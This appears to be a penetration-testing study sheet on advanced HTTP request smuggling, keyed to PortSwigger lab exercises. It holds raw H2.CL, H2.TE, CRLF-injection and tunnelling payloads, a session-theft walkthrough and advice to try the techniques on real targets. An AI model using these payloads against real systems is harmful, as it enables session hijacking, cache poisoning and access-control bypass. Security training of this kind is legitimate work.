# HTTP request smuggling - Advanced (HTTP/2 downgrade, CRLF, tunnelling, 0.CL)

When the front-end speaks HTTP/2 but downgrades to HTTP/1 for the back-end, the rewrite re-introduces smuggling - and CRLF sequences that are illegal in h2 become real header/line breaks after downgrade. Plus response-queue poisoning (steal whole responses), request splitting, request tunnelling (leak internal headers / poison cache on connection-per-request stacks), and 0.CL. Impact: capture admin sessions, cache-poison, bypass access controls - even where classic CL.TE is patched.

## Quick reference

```
# H2.CL - h2 request with a bogus Content-Length; back-end (h1) trusts it after downgrade
POST / HTTP/2
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1                       # smuggles a prefix past the FE

# H2.TE / response-queue poisoning - h2 + Transfer-Encoding: chunked
POST /x HTTP/2
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: LAB
                          # poisons the response queue -> steal next user's response

# CRLF injection via h2 header VALUE (Inspector): name=foo value=bar\r\nTransfer-Encoding: chunked
# CRLF via h2 header NAME (request tunnelling): name="foo: bar\r\nHost: abc" value=xyz
```
Decision list: site advertises HTTP/2? Switch protocol to HTTP/2 in the Inspector. Try H2.CL, then H2.TE. If the stack blocks header smuggling, inject CRLF via h2 header **names/values** or the `:path` pseudo-header. Connection-per-request back-end -> request **tunnelling** (HEAD) instead of classic smuggling.

## Root cause
**HTTP downgrading**: an h2 front-end translates each h2 request into h1 for the back-end. h2's binary framing has one length mechanism (safe), but the downgrade can (a) trust an attacker-supplied `Content-Length`/`Transfer-Encoding` it shouldn't, and (b) faithfully copy `\r\n` from h2 header names/values into the h1 byte-stream, letting you inject new headers or a whole new request line.

## Find it
- Confirm h2 support (TLS ALPN); in Burp Repeater set protocol to **HTTP/2** (Inspector -> Request attributes).
- Probe **H2.CL** (`Content-Length: 0` + body) and **H2.TE** (`Transfer-Encoding: chunked` + `0\r\n\r\n` prefix): every **second** request returns 404 if the prefix smuggled.
- Probe **CRLF**: add a header whose value contains `\r\n<injected header>` (Inspector lets you add raw `\r\n`); if the injected header takes effect, the stack is downgrade-CRLF-vulnerable.
- **Hidden h2 support**: some servers speak h2 but don't advertise it via ALPN, so clients fall back to h1 and you miss the attack surface. Force h2 in Burp: **Settings -> Tools -> Repeater -> Connections -> enable "Allow HTTP/2 ALPN override"**, then set Protocol = HTTP/2 in the Inspector. (Burp Scanner Pro auto-detects this.)

## Technique
**H2.CL:** include `Content-Length: 0` in an h2 POST; the FE forwards your body, the h1 back-end reads 0 bytes and treats the body as the next request -> smuggled prefix. Redirect a follow-up `GET /resources` to an arbitrary `Host` (your exploit server) -> XSS.

**H2.TE / Response-queue poisoning (RQP):** smuggle a **complete** request (`GET /x` to a 404 path) via `Transfer-Encoding: chunked` over h2. This desyncs the **response queue**: after poisoning, every request you send returns the *previous* user's response. Poll (wait ~5s, resend) until you capture a victim's `302` containing their post-login session cookie -> ATO.
- **Impact:** catastrophic + persistent - every user on that FE/BE connection is served someone else's responses (also breaks the site for them).
- **3 criteria:** (1) FE↔BE TCP connection is **reused**; (2) you can smuggle a **complete, standalone** request that gets its own response; (3) the attack **doesn't close** the connection (invalid requests make servers close it).
- **Why "complete":** a *prefix* smuggle leaves 2 requests; a smuggle *with a body* makes the BE see **3** (the 3rd = leftover bytes -> invalid -> connection closes). Smuggling **exactly two** complete requests keeps the connection open: FE thinks it sent 1, BE sends 2 responses -> the extra response is queued -> every later request gets the **previous** response. 
- **Steal:** issue arbitrary follow-ups (Burp Intruder) to harvest many users' responses; connection commonly closes after **~100 requests**, then just **repoison**. Use a **non-existent path** in both requests so your own responses are a consistent 404 (easy to tell apart from captured ones).

**Request smuggling via CRLF injection:** inject `\r\nTransfer-Encoding: chunked` into an h2 header **value**, then smuggle a body prefix; or split via h2 header value `bar\r\n\r\nGET /x HTTP/1.1\r\nHost: LAB` to inject a whole request (request **splitting**) - when the FE appends `\r\n\r\n`, your prefix becomes a complete request, poisoning the queue.

**Request tunnelling:** when the FE↔BE connection is **not reused** (or restricted to same IP/client), classic smuggling can't touch other users - but you can still make **one** request elicit **two** BE responses, hiding a request+response from the front-end. This bypasses front-end controls and even some anti-smuggling defenses.
- **h2 confirms it:** in h2 each stream = one request/response, so an **HTTP/1 response inside an h2 response body** proves the tunnel (in h1-only, two responses are ambiguous due to keep-alive).
- **Leaking internal headers (body-param trick):** make FE and BE disagree on where headers end. Inject `foo: bar\r\nContent-Length: 200\r\n\r\ncomment=` - FE appends its internal headers *after* `comment=` (still "headers" to it); BE sees `\r\n\r\n` as end-of-headers, so `comment=` + the internal headers become the **body** -> the internal headers (e.g. `X-Internal-Header: secret`, FE-added cookies) reflect as the comment value.
- **Blind vs non-blind:** if the FE reads *all* BE bytes, both responses come back (tunnelled nested in body) = **non-blind**; if it reads only `Content-Length` bytes, you get only the first = **blind**.
- **Non-blind via HEAD:** a `HEAD` response carries the `Content-Length` of the *GET* resource (no body). A FE that honors it **over-reads** the BE socket -> you see the start of the **tunnelled** response mixed in. Balancing act: if the HEAD resource is **shorter** than the tunnelled response it truncates (pad via a reflected input in the HEAD request); if **longer**, it times out (pad the *tunnelled* response, or point HEAD at a different-length endpoint).
- **Cache poisoning via tunnelling (content-type mixing):** tunnel a request whose response reflects unencoded input but has a safe `Content-Type` (e.g. `application/json {"name":"test<script>alert(1)</script>"}`). Via HEAD over-read it inherits the **outer** response's `Content-Type: text/html` -> the script executes; the FE cache stores the mixed response and serves it to others -> stored XSS.

**0.CL:** front-end **ignores** a `Content-Length` that the back-end **processes** (opposite of CL.0). Long thought unexploitable due to a server deadlock; broken with an **early-response gadget** (make the back-end respond before the full body arrives) + a **double desync** to build a full exploit. PortSwigger "HTTP/1.1 Must Die". `[from-writeup]` - lab solution is a video walkthrough.

**Standalone newline (`\n`) smuggling (HTTP/1 discrepancy):** in pure HTTP/1, some front-ends don't treat a bare `\n` as a header delimiter but the back-end does - so `Foo: bar\nTransfer-Encoding: chunked` hides the TE header from the front-end. Full `\r\n` is always a delimiter, so this only works with a lone `\n`. (In h2 the same idea works because `\r\n` inside a header value is preserved until downgrade - see CRLF injection above.)

**H2.CL vs H2.TE (downgrade mechanics):** the front-end derives the h1 `Content-Length` from h2's built-in frame length, but if it instead **reuses an attacker-supplied `content-length`** (not re-validated) -> **H2.CL**. If it **fails to strip `transfer-encoding: chunked`** before downgrading -> **H2.TE**. Either gives a smuggling prefix on the h1 back-end.

**Duplicate-header mitigation (important for h2 prefixes):** when the victim's request is appended to your smuggled prefix, its headers can clash (duplicate-header errors). Mitigate by ending your smuggled prefix with a trailing body parameter + a `Content-Length` slightly **longer** than the body - the victim's request still appends but is **truncated before its headers**.

**Accounting for front-end rewriting (request splitting):** front-ends strip `:authority` and add a new `Host` during downgrade, often **appended after** your injected headers - which can land it in the *wrong* (smuggled) request. Position your injected `Host` so it ends up in the **first** request after the split:
```
:method GET   :path /   :authority LAB
foo  bar\r\nHost: LAB\r\n\r\nGET /admin HTTP/1.1
```

## Payload arsenal
```
# H2.CL redirect to exploit server (XSS)
POST / HTTP/2
Host: LAB
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER.exploit-server.net
Content-Length: 5

x=1

# H2.TE response-queue poisoning (smuggle complete req to 404 path)
POST /x HTTP/2
Host: LAB
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: LAB

# CRLF via header value (Inspector):  name=foo  value=bar\r\nTransfer-Encoding: chunked
# request splitting via header value:
#   name=foo  value=bar\r\n\r\nGET /x HTTP/1.1\r\nHost: LAB
# request tunnelling via header name:
#   name="foo: bar\r\nHost: abc"   value=xyz
# tunnelling via :path (HEAD):
#   :path = /?cb=2 HTTP/1.1\r\nHost: LAB\r\n\r\nGET /post?postId=1 HTTP/1.1\r\nFoo: bar
```

## Bypasses
| Blocker | Bypass |
|---|---|
| client forces HTTP/2 | that's the point - use h2 downgrade vectors here |
| classic CL.TE patched | H2.CL / H2.TE via downgrade |
| header smuggling filtered | CRLF inject via h2 header **names** or `:path` pseudo-header |
| back-end uses 1 connection/request | request **tunnelling** (HEAD) instead of smuggling |
| h2 not advertised | try hidden h2 support anyway |

## Exploitation walkthrough (H2.TE response-queue poisoning -> admin ATO)
1. Repeater protocol = HTTP/2. Send `POST /x HTTP/2` + `Transfer-Encoding: chunked` + `0\r\n\r\nGET /x HTTP/1.1\r\nHost: LAB\r\n\r\n`.
2. You get a 404 (your `/x`). Wait ~5s; resend. Most responses are your own 404.
3. Keep polling; a non-404 (e.g. **302** with `Set-Cookie: session=...`) is the **admin's** response captured from the queue.
4. Use the admin session cookie -> solved. (If stuck on 200s, send ~10 plain requests to reset the connection.)

## Chaining
- Captured admin session -> [Access-control](../../Access-control/)/[Authentication](../../Authentication/).
- Tunnelling/H2.CL redirect -> [XSS](../../XSS/), [Web-cache-poisoning](../../Web-cache-poisoning/).
- CRLF concepts overlap [HTTP-Host-header-attacks](../../HTTP-Host-header-attacks/).

## Tools
- **Burp Repeater + Inspector** (HTTP/2; add raw `\r\n` in header names/values; Change request method to HEAD).
- **HTTP Request Smuggler** (h2 downgrade detection), **Turbo Intruder** (response-queue polling).

## Labs

### H2.TE response-queue poisoning via TE request smuggling [Practitioner]
URL: .../advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling - h2 + `Transfer-Encoding: chunked`, smuggle complete `GET /x`; poll the queue for a 302 with admin cookie.

### H2.CL request smuggling [Practitioner]
URL: .../advanced/lab-request-smuggling-h2-cl-request-smuggling - h2 `Content-Length: 0` smuggles a prefix; redirect `GET /resources` to exploit server -> `alert(document.cookie)`.

### Request smuggling via CRLF injection [Practitioner]
URL: .../advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection - inject `\r\nTransfer-Encoding: chunked` into an h2 header value; smuggle `POST /` with large CL so your prefix reflects via search; capture next user's request.

### Request splitting via CRLF injection [Practitioner]
URL: .../advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection - h2 header value `bar\r\n\r\nGET /x HTTP/1.1\r\nHost: LAB`; FE appends `\r\n\r\n` -> complete smuggled request -> poison queue -> capture admin 302.

### 0.CL request smuggling [Expert]
URL: .../advanced/lab-request-smuggling-0cl-request-smuggling - FE honors body CL, BE treats as 0; desync to run `alert()` in the victim's browser. `[from-writeup]` (video solution; "HTTP/1.1 Must Die").

### H2 bypass access controls via request tunnelling [Expert]
URL: .../advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling - CRLF via h2 header name to inject `Content-Length` + extra `search` param; the FE-appended internal headers (incl. `cookie: session=`) reflect -> leak admin creds / reach controls.

### H2 web cache poisoning via request tunnelling [Expert]
URL: .../advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling - inject via `:path` pseudo-header, use HEAD to tunnel a response, poison the cache with a reflected HTML XSS gadget.

Real-target transfer: on h2-front/h1-back stacks, always test H2.CL, H2.TE, and CRLF via h2 header names/`:path`. Connection-per-request back-ends -> tunnelling (HEAD). A captured 302/`Set-Cookie` from the response queue = session theft.

## Real-world notes
- These come straight from PortSwigger research ("HTTP/2: The Sequel is Always Worse", "Browser-Powered Desync"); they hit real CDNs/gateways.
- Response-queue poisoning and tunnelling are high-skill, high-impact - note exact server versions and downgrade behavior in reports.

## References
- https://portswigger.net/web-security/request-smuggling/advanced
